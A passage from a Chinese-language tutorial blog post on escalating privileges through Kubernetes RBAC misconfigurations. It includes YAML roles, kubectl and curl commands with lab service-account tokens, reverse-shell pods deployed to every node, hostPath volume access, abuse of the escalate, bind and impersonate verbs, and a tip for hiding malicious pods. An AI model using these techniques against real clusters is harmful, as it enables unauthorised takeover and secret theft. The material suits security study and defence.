class="string">kubernetes.io/service-account-token</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-list-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-list-binding</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-list-sa</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-list-role</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure>相关api<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取指定的 Secret</span></span><br><span class="line">GET /api/v1/namespaces/&#123;namespace&#125;/secrets/&#123;name&#125;</span><br><span class="line"><span class="comment"># 列出指定命名空间下为 Secret 的对象</span></span><br><span class="line">GET /api/v1/namespaces/&#123;namespace&#125;/secrets</span><br><span class="line"><span class="comment"># 列出 Secret 对象</span></span><br><span class="line">GET /api/v1/secrets</span><br></pre></td></tr></table></figure>获取sa的token，利用list权限发送api到master测试<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get secrets secret-list-build -ojsonpath=&#123;.data.token&#125; | <span class="built_in">base64</span> -d</span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IkpBS09mWHo0cU55bWI3NVV6cW4yQVV2MXFaUTJRX2tualZqeV9PbDVIOFEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InNlY3JldC1saXN0LWJ1aWxkIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InNlY3JldC1saXN0LXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMWIwYmNiMjAtNThkNS00ZjAxLTljNDUtZTdlYzM4NjA0MTYzIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LWxpc3Qtc2EifQ.gTG8uTOn-zMO1BmYNNaTT2rx_qSAsWNKstRlzOmHJtqGwzUaNR65KRjE102r52rsUIxnfZL2ySr_G-Dg66MaxcGIVJtZZZFfsfE-LsDkSpPgJvTGVEyl3glL3jHDho39CYygPw8G1bPk-_w7kXFPjo476efT2_YUwwNh1xgQ_kwuD3Fo-ajFETvxv7tvnYYizWYjw7XU7EZkpBDamkqJFKmYpKGG1Atc7inm9LE5qB2DOKvxyqXyWvsT5TcubJEfC6BzN3MzzLa6sKcUpbPAdrM6HWiYTnkLKjIonzaWJZaoRvB67klyapikl1cPorrOFHQNYbimuneO6hOLOXdgeg</span><br><span class="line">$ curl -k -H <span class="string">&quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkpBS09mWHo0cU55bWI3NVV6cW4yQVV2MXFaUTJRX2tualZqeV9PbDVIOFEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InNlY3JldC1saXN0LWJ1aWxkIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InNlY3JldC1saXN0LXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOWYyOGRmZmEtYTE4Yy00OThmLTg5NzMtNzU4MTA0MTNiZDU2Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LWxpc3Qtc2EifQ.KEzhwM3hW7jGS4tBQLSfHg0IL42BOacGJvlpy0HCW7VtAVBHN2-Hs31nHdTvbiXTH5QX7XdCb_wPBlDfx9WZQBSfpaV7RZGcDTvi4rg6E0JQyIyBFk5oBYe0WYLWrPHTcrcCx8uKojoz6KRHytSpAsu2B0oSDayVy8B55ByFlTqCccZ-qjCXv22myZqNpV2WGtP3iQ_b4WKwQHMZ3RWeD_PwTWCddkvZCuvWMJiltIgQeVmmlX-nFPK7X1N81qbi0DlQapoXIAMLqwjS7Ungct3kSQIIr_oEZ3CJusyEAxQfpvpBmHf3lsLYlgpFNNERJz4Vq1sxFXbF0bAgw8HXmg&quot;</span> https://192.168.56.10:6443/api/v1/namespaces/default/secrets/</span><br></pre></td></tr></table></figure>查看default命名空间下的没问题<br><img src="https://s2.loli.net/2023/01/16/7z653nwFjIg4b2N.png" alt="image.png"><br>但是进一步利用查看kube-system下的不可以，显示403说明使用Role如果不指定对应的命名空间是无法获取的<br><img src="https://s2.loli.net/2023/01/16/myEb49LtJG3Q7Fp.png" alt="image.png"></li></ul><p>由于ClusterRole的机制，哪怕主体不同可以是组、用户还是服务账户主要还是看绑定的角色，虽然sa是default下的，但是通过绑定ClusterRole可以查看kube-system下的Secret，由于Role规定再创建时必须指定命名空间，除非指定kube-system否则无法查看，而ClusterRole就利用机会很大了；获取到关键Secrets可以进一步利用。</p><h1 id="创建工作负载"><a href="#创建工作负载" class="headerlink" title="创建工作负载"></a>创建工作负载</h1><p>当被允许创建工作负载（Pod、Deployments、DaemonSet等）资源时，该权限其实还授予了对该命名空间中许多其他资源的权限，比如在Pod中挂载Secret、ConfigMap、PV等。由于ServiceAccount其实是为Pod中运行的进程提供了一个身份，所以Pod内的进程可以使用其关联的sa的身份，来向Cluster的api-server访问，所以授予创建工作负载的权限的同时也授予了命名空间下任何sa对api-server的访问权限。</p><p>如果RBAC的资源允许对Deployments、DaemonSet等操作，我们可以通过批量创建特权Pod来达到k8s内横向并持久化，获取Cluster Admin权限，以及所有node的权限。</p><p>针对Deployments的利用创建需要的资源：</p><ul><li>Role</li><li>RoleBinding<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span> </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;apps&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;deployments&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>, <span class="string">&quot;delete&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-binding</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">k8s-user</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-role</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure>用户被绑定Role后测试可以get命名空间为default下的deployments.apps资源<br><img src="https://s2.loli.net/2023/01/16/EMzokjBtF1NbLYr.png" alt="image.png"><br>其他命名空间下的是的不能看的，Role未指定namespace的情况默认为default<br>这边尝试创建一个deployments.apps，在containers中填写spec反弹shell<br><img src="https://s2.loli.net/2023/01/16/oieVcjv3rFEM4sG.png" alt="image.png"><br><img src="https://s2.loli.net/2023/01/16/dJfZYirEX2TQMUq.png" alt="image.png"><br>成功反弹，在只有default命名空间对deployments操作的权限下，在所有节点创建pod并反弹，这里只是举例container的image使用nginx，实际中可以使用恶意镜像，为了隐蔽建议使用kube-proxy，因为每个节点本身都有这个镜像，并且本身可以逃逸到宿主机上。<br>将Role改为ClusterRole，自然也是可以的，并且在未指定namespace的情况下是可以查看整个集群的，可以利用一些更隐蔽点。</li></ul><h1 id="创建持久卷"><a href="#创建持久卷" class="headerlink" title="创建持久卷"></a>创建持久卷</h1><p>持久卷(PersistentVolume)是k8s中用来存储的，可以理解为一块虚拟硬盘，一般持久卷是集群管理员事先创建好的，或者使用存储类动态创建，对于pod而言不直接使用pv，而是通过pvc作为存储卷匹配符合需求的pv使用的，所以一般用户不会授予针对pv的创建权限，可以通过创建pv访问node上所有的数据，达到提权的目的。</p><p>在 Kubernetes 中，存储卷是由容器使用的，所以它不能直接写入数据。如果想要写入数据，需要在 Kubernetes 集群中创建容器，并将存储卷挂载到容器中。然后，通过容器提供的接口来写入数据。</p><p>当用户创建工作负载的权限时，不需要创建pv的权限就可以直接使用存储卷，比如使用本地存储hostPath配置容忍度结合nodeSelector达到挂载任意node。<br>利用前提拥有对pv、pvc、pod创建权限，利用相关的声明配置文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span> </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;persistentvolumes&quot;</span>, <span class="string">&quot;persistentvolumesclaims&quot;</span>, <span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv-binding</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">k8s-user</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pv-role</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolume</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">local-pv</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">capacity:</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="string">4Gi</span></span><br><span class="line">  <span class="attr">volumeMode:</span> <span class="string">Filesystem</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ReadWriteOnce</span></span><br><span class="line">  <span class="attr">persistentVolumeReclaimPolicy:</span> <span class="string">Delete</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">local-storage</span></span><br><span class="line">  <span class="attr">local:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/root</span></span><br><span class="line">  <span class="attr">nodeAffinity:</span></span><br><span class="line">    <span class="attr">required:</span></span><br><span class="line">      <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">matchExpressions:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">kubernetes.io/hostname</span></span><br><span class="line">          <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">          <span class="attr">values:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">k8s-worker1</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PersistentVolumeClaim</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">local-pv-claim</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">storageClassName:</span> <span class="string">local-storage</span></span><br><span class="line">  <span class="attr">accessModes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ReadWriteOnce</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">requests:</span></span><br><span class="line">      <span class="attr">storage:</span> <span class="string">3Gi</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">test-pd</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:1.22</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">test-container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/test-pd</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-pv-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-pv-volume</span></span><br><span class="line">      <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">        <span class="attr">claimName:</span> <span class="string">local-pv-claim</span></span><br></pre></td></tr></table></figure><h1 id="Esclate-verb"><a href="#Esclate-verb" class="headerlink" title="Esclate verb"></a>Esclate verb</h1><p>RBAC本身是一种鉴权机制，是为了整个集群更加安全的，RBAC会阻止用户创建比它本身拥有更多权限的Role或者ClusterRole，但是在verb中escalate是一个例外，拥有这个verb的用户可以用来提权。</p><p>目前k8s-user拥有针对pods的相关权限，但是对于secrets并无权限<br><img src="https://s2.loli.net/2023/01/16/7ArOnS8HVNwGFDP.png" alt="image.png"><br>创建一个对于roles拥有verb为escalate的Role</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">role-escalate</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;rbac.authorization.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;roles&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;escalate&quot;</span>]</span><br></pre></td></tr></table></figure><p>该用户拥有了查看role的权限<br><img src="https://s2.loli.net/2023/01/16/zuH1EF8yalmNj25.png" alt="image.png"><br>尝试使用k8s-user用户创建一个针对secrets的Role<br><img src="https://s2.loli.net/2023/01/16/dnhZXVKO5pwyfvS.png" alt="image.png"><br>成功创建了一个k8s-user用户本身也不具有查看secrets的Role，如果该用户一开始就具有对roles的patch权限的话，我们可以对该用户的Role直接修改<br><img src="https://s2.loli.net/2023/01/16/9uJbnxKyks3z657.png" alt="image.png"><br><img src="https://s2.loli.net/2023/01/16/tWAzjPkBeJRYp9T.png" alt="image.png"><br><img src="https://s2.loli.net/2023/01/16/iNZS9fT74pdXnou.png" alt="image.png"><br>修改成功，目前该用户可以查看secrets。<br>目前escalate只能针对相关范围的，Role的只能操作相关命名空间作用域的，ClusterRole可以操作命名空间或者集群的，具体看resources是那个的。</p><h1 id="Bind-verb"><a href="#Bind-verb" class="headerlink" title="Bind verb"></a>Bind verb</h1><p>bind和esclate类似，拥有该权限的用户也可以进行提权操作，只不过这个操作的是直接绑定自己没有权限的角色，比如下面这个yaml。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">role-grantor</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;rbac.authorization.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;rolebindings&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;rbac.authorization.k8s.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;clusterroles&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;bind&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">role-binding</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">k8s-user</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">role-grantor</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>该yaml创建了一个ClusterRole，拥有对rolebindings的create权限，对clusterroles的bind权限；创建了一个RoleBinding将刚才创建的ClusterRole绑定到了k8s-user上，目前该用户拥有了创建一个RoleBinding然后将自己绑定在高权限的ClusterRole上达到提权的效果。<br>目前该用户还未提权时，不能查看configmaps<br><img src="https://s2.loli.net/2023/01/16/A5tTKBEcg24NDFP.png" alt="image.png"><br>通过创建RoleBinding提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl create rolebinding bind-admin --clusterrole=admin --user=k8s-user</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="comment"># 不能使用apply，因为apply是先get再create，因为没有get权限</span></span><br><span class="line">$ kubectl create -f - &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">apiVersion: rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="string">kind: RoleBinding</span></span><br><span class="line"><span class="string">metadata:</span></span><br><span class="line"><span class="string">  name: bind-admin</span></span><br><span class="line"><span class="string">subjects:</span></span><br><span class="line"><span class="string">- kind: User</span></span><br><span class="line"><span class="string">  name: k8s-user</span></span><br><span class="line"><span class="string">  apiGroup: rbac.authorization.k8s.io</span></span><br><span class="line"><span class="string">roleRef:</span></span><br><span class="line"><span class="string">  kind: ClusterRole</span></span><br><span class="line"><span class="string">  name: admin</span></span><br><span class="line"><span class="string">  apiGroup: rbac.authorization.k8s.io</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p>提权成功现在可以查看configmaps<br><img src="https://s2.loli.net/2023/01/16/7JHAYC2hpQE584k.png" alt="image.png"><br>由于该用户只有对rolebindings的权限，并且绑定的是admin，所以对于集权作用域的还是没有权限<br><img src="https://s2.loli.net/2023/01/16/taq5FPWSMUCNETv.png" alt="image.png"><br>想要获得针对整个集群完全的提权还是需要对clusterrolebinding的权限，绑定cluster-admin<br><img src="https://s2.loli.net/2023/01/16/tfgD8xKR6wqW3ns.png" alt="image.png"></p><h1 id="Impersonate-verb"><a href="#Impersonate-verb" class="headerlink" title="Impersonate verb"></a>Impersonate verb</h1><p>该动词有点类似于Linux下的sudo，通过该动词用户可以达到扮演其他用户的效果，获得相关用户的权限，其原理主要就是通过请求api-server的时候，通过指定<code>http header</code>实现扮演用户的效果。<br>相关subjects举例：</p><ul><li>Impersonate-User: 扮演的用户的用户名</li><li>Impersonate-Group: 扮演的用户组，多个值（出现多次）表示多个组，需要同时指定 Impersonate-User</li><li>Impersonate-Extra-( extra name ): 动态指定的 key，用于指定用户的其他信息，需要同时指定 Impersonate-User<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Impersonate-User: jane.doe@example.com</span><br><span class="line">Impersonate-Group: developers</span><br><span class="line">Impersonate-Group: admins</span><br><span class="line">Impersonate-Extra-dn: cn=jane,ou=engineers,dc=example,dc=com</span><br><span class="line">Impersonate-Extra-acme.com%2Fproject: some-project</span><br><span class="line">Impersonate-Extra-scopes: view</span><br><span class="line">Impersonate-Extra-scopes: development</span><br></pre></td></tr></table></figure></li></ul><p>扮演其他角色可以使用kubectl或者curl发送api<br>kubectl 命令的 <code>--as</code> 可以配置 <code>Impersonate-User</code> 的值， <code>--as-group</code> 可以配置 <code>Impersonate-Group</code> 的值，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kubectl --as &lt;user-to-impersonate&gt; ...</span><br><span class="line">kubectl --as &lt;user-to-impersonate&gt; --as-group &lt;group-to-impersonate&gt; ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># eg</span></span><br><span class="line">kubectl --as=system:serviceaccount:kube-system:default</span><br><span class="line">kubectl --as=superman --as-group=system:masters</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl</span></span><br><span class="line">curl -k -v -XGET -H <span class="string">&#x27;Authorization: Bearer ***&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Impersonate-User: ***&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Impersonate-Group: ***&#x27;</span> \</span><br><span class="line"> <span class="string">&#x27;https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/nodes&#x27;</span> | jless</span><br></pre></td></tr></table></figure><p>以下是一个可以扮演 user、group、serviceaccount的ClusterRole例子:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">impersonate-verb</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;users&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;serviceaccounts&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span 